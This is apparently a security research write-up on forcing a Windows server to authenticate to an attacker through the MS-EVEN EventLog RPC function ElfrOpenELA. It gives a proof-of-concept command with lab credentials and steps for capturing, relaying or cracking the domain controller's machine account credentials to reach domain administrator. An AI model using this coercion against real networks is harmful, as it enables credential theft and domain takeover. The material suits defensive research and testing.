# MS-EVEN - Remote call to ElfrOpenELA (opnum 14)

## Summary

+ **Protocol**: [[MS-EVEN]: EventLog Remoting Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)

+ **Protocol UUID**: 82273fdc-e32a-18c3-3f78-827929dc23ea

+ **Protocol version**: 0.0

+ **SMB Named pipe**: `\PIPE\eventlog`

+ **Function name**: [`ElfrOpenELA`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-even/ba5ecaf7-8ed5-4506-a4f0-11f70614c269)

+ **Function operation number**: `14`

+ **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `\PIPE\eventlog` and bind to the desired [`MS-EVEN`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f) protocol (with uuid `82273fdc-e32a-18c3-3f78-827929dc23ea` and version `0.0`) in order to perform remote procedure calls to functions in the [`MS-EVEN`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f) protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `\PIPE\eventlog` This pipe is connected to the protocol [[MS-EVEN]: EventLog Remoting Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f) and allows to call RPC functions of this protocol. We will then call the remote [`ElfrOpenELA`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-even/ba5ecaf7-8ed5-4506-a4f0-11f70614c269) function on the remote Windows Server (192.168.2.1) with the following parameters:

```cpp
ElfrOpenELA('192.168.2.51\x00')
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!


## Function technical detail

```cpp
NTSTATUS ElfrOpenELA(
   [in] EVENTLOG_HANDLE_A UNCServerName,
   [in] PRPC_STRING ModuleName,
   [in] PRPC_STRING RegModuleName,
   [in] unsigned long MajorVersion,
   [in] unsigned long MinorVersion,
   [out] IELF_HANDLE* LogHandle
 );
```

## References

+ Documentation of protocol [MS-EVEN]: EventLog Remoting Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f

+ Documentation of function `ElfrOpenELA`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-even/ba5ecaf7-8ed5-4506-a4f0-11f70614c269